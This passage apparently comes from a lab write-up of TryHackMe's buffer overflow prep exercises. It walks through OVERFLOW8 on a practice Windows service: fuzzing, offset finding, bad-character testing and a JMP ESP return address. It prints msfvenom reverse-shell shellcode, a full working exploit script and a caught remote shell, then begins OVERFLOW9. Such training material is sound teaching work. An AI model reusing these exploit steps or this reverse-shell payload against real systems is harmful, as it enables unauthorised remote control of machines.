Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C 
```
{% endraw %}

<br />
Update the code with the pattern_create string that we just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 2200
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the EIP and note the value that is stored in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of8/thirdeip.png" title="Get EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the string from the regster through msf-pattern_offset to get the exact offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
└─$ msf-pattern_offset -l 2200 -q 68433568
[*] Exact match at offset 1786
```
{% endraw %}

<br />
Update the code to include the offset value that we just calculated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1786
inputBuffer += b'B' * 4
imputBuffer += b'C' * (2200 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1786
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2200 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP register to view the baschars and find any mangles.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of8/firstbadesp.png" title="First Badchar ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x1d\x2e\xc7\xee

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1786
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2200 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of8/narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nmod to get a list of modules and their security to find the appropriate module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of8/findaddy.png" title="Find address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that was discovered in the essfunc.dll.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x1d\x2e\xc7\xee

payload = b'D' * 400

inputBuffer = b'A' * 1786
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (2200 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -v payload -f python -b '\x00\x1d\x2e\xc7\xee'    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xda\xc8\xbb\x6b\x91\x20\x0f\xd9\x74\x24\xf4"
payload += b"\x5a\x29\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17"
payload += b"\x83\x81\x6d\xc2\xfa\xa9\x66\x81\x05\x51\x77"
payload += b"\xe6\x8c\xb4\x46\x26\xea\xbd\xf9\x96\x78\x93"
payload += b"\xf5\x5d\x2c\x07\x8d\x10\xf9\x28\x26\x9e\xdf"
payload += b"\x07\xb7\xb3\x1c\x06\x3b\xce\x70\xe8\x02\x01"
payload += b"\x85\xe9\x43\x7c\x64\xbb\x1c\x0a\xdb\x2b\x28"
payload += b"\x46\xe0\xc0\x62\x46\x60\x35\x32\x69\x41\xe8"
payload += b"\x48\x30\x41\x0b\x9c\x48\xc8\x13\xc1\x75\x82"
payload += b"\xa8\x31\x01\x15\x78\x08\xea\xba\x45\xa4\x19"
payload += b"\xc2\x82\x03\xc2\xb1\xfa\x77\x7f\xc2\x39\x05"
payload += b"\x5b\x47\xd9\xad\x28\xff\x05\x4f\xfc\x66\xce"
payload += b"\x43\x49\xec\x88\x47\x4c\x21\xa3\x7c\xc5\xc4"
payload += b"\x63\xf5\x9d\xe2\xa7\x5d\x45\x8a\xfe\x3b\x28"
payload += b"\xb3\xe0\xe3\x95\x11\x6b\x09\xc1\x2b\x36\x46"
payload += b"\x26\x06\xc8\x96\x20\x11\xbb\xa4\xef\x89\x53"
payload += b"\x85\x78\x14\xa4\xea\x52\xe0\x3a\x15\x5d\x11"
payload += b"\x13\xd2\x09\x41\x0b\xf3\x31\x0a\xcb\xfc\xe7"
payload += b"\x9d\x9b\x52\x58\x5e\x4b\x13\x08\x36\x81\x9c"
payload += b"\x77\x26\xaa\x76\x10\xcd\x51\x11\x15\x12\x59"
payload += b"\xe7\x41\x10\x59\xe6\x2a\x9d\xbf\x82\x5c\xc8"
payload += b"\x68\x3b\xc4\x51\xe2\xda\x09\x4c\x8f\xdd\x82"
payload += b"\x63\x70\x93\x62\x09\x62\x44\x83\x44\xd8\xc3"
payload += b"\x9c\x72\x74\x8f\x0f\x19\x84\xc6\x33\xb6\xd3"
payload += b"\x8f\x82\xcf\xb1\x3d\xbc\x79\xa7\xbf\x58\x41"
payload += b"\x63\x64\x99\x4c\x6a\xe9\xa5\x6a\x7c\x37\x25"
payload += b"\x37\x28\xe7\x70\xe1\x86\x41\x2b\x43\x70\x18"
payload += b"\x80\x0d\x14\xdd\xea\x8d\x62\xe2\x26\x78\x8a"
payload += b"\x53\x9f\x3d\xb5\x5c\x77\xca\xce\x80\xe7\x35"
payload += b"\x05\x01\x07\xd4\x8f\x7c\xa0\x41\x5a\x3d\xad"
payload += b"\x71\xb1\x02\xc8\xf1\x33\xfb\x2f\xe9\x36\xfe"
payload += b"\x74\xad\xab\x72\xe4\x58\xcb\x21\x05\x49" 
```
{% endraw %}

<br />
Update the code with a nop sled and the payload we just generated.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x1d\x2e\xc7\xee

payload =  b""
payload += b"\xda\xc8\xbb\x6b\x91\x20\x0f\xd9\x74\x24\xf4"
payload += b"\x5a\x29\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17"
payload += b"\x83\x81\x6d\xc2\xfa\xa9\x66\x81\x05\x51\x77"
payload += b"\xe6\x8c\xb4\x46\x26\xea\xbd\xf9\x96\x78\x93"
payload += b"\xf5\x5d\x2c\x07\x8d\x10\xf9\x28\x26\x9e\xdf"
payload += b"\x07\xb7\xb3\x1c\x06\x3b\xce\x70\xe8\x02\x01"
payload += b"\x85\xe9\x43\x7c\x64\xbb\x1c\x0a\xdb\x2b\x28"
payload += b"\x46\xe0\xc0\x62\x46\x60\x35\x32\x69\x41\xe8"
payload += b"\x48\x30\x41\x0b\x9c\x48\xc8\x13\xc1\x75\x82"
payload += b"\xa8\x31\x01\x15\x78\x08\xea\xba\x45\xa4\x19"
payload += b"\xc2\x82\x03\xc2\xb1\xfa\x77\x7f\xc2\x39\x05"
payload += b"\x5b\x47\xd9\xad\x28\xff\x05\x4f\xfc\x66\xce"
payload += b"\x43\x49\xec\x88\x47\x4c\x21\xa3\x7c\xc5\xc4"
payload += b"\x63\xf5\x9d\xe2\xa7\x5d\x45\x8a\xfe\x3b\x28"
payload += b"\xb3\xe0\xe3\x95\x11\x6b\x09\xc1\x2b\x36\x46"
payload += b"\x26\x06\xc8\x96\x20\x11\xbb\xa4\xef\x89\x53"
payload += b"\x85\x78\x14\xa4\xea\x52\xe0\x3a\x15\x5d\x11"
payload += b"\x13\xd2\x09\x41\x0b\xf3\x31\x0a\xcb\xfc\xe7"
payload += b"\x9d\x9b\x52\x58\x5e\x4b\x13\x08\x36\x81\x9c"
payload += b"\x77\x26\xaa\x76\x10\xcd\x51\x11\x15\x12\x59"
payload += b"\xe7\x41\x10\x59\xe6\x2a\x9d\xbf\x82\x5c\xc8"
payload += b"\x68\x3b\xc4\x51\xe2\xda\x09\x4c\x8f\xdd\x82"
payload += b"\x63\x70\x93\x62\x09\x62\x44\x83\x44\xd8\xc3"
payload += b"\x9c\x72\x74\x8f\x0f\x19\x84\xc6\x33\xb6\xd3"
payload += b"\x8f\x82\xcf\xb1\x3d\xbc\x79\xa7\xbf\x58\x41"
payload += b"\x63\x64\x99\x4c\x6a\xe9\xa5\x6a\x7c\x37\x25"
payload += b"\x37\x28\xe7\x70\xe1\x86\x41\x2b\x43\x70\x18"
payload += b"\x80\x0d\x14\xdd\xea\x8d\x62\xe2\x26\x78\x8a"
payload += b"\x53\x9f\x3d\xb5\x5c\x77\xca\xce\x80\xe7\x35"
payload += b"\x05\x01\x07\xd4\x8f\x7c\xa0\x41\x5a\x3d\xad"
payload += b"\x71\xb1\x02\xc8\xf1\x33\xfb\x2f\xe9\x36\xfe"
payload += b"\x74\xad\xab\x72\xe4\x58\xcb\x21\x05\x49"

inputBuffer = b'A' * 1786
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (2200 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.  Run the code.  Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56200
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}

<br />
<b><u>OVERFLOW9<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW9 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW9 aaaa\r\n')
print(s.recv(1024))

s.close() 
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 30:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW9/thm-overflow9_0x01.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
[*] Sending: 500
[*] Sending: 600
[*] Sending: 700
[*] Sending: 800
[*] Sending: 900
[*] Sending: 1000
[*] Sending: 1100
[*] Sending: 1200
[*] Sending: 1300
[*] Sending: 1400
[*] Sending: 1500
[*] Sending: 1600
```
{% endraw %}

<br />
Check the EIP to ensure that we have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of9/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to hardcode the size that breaks the buffer.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 2000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Run the code and check EIP to ensure that we still have control.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of9/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
└─$ msf-pattern_create -l 2000                                                                  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1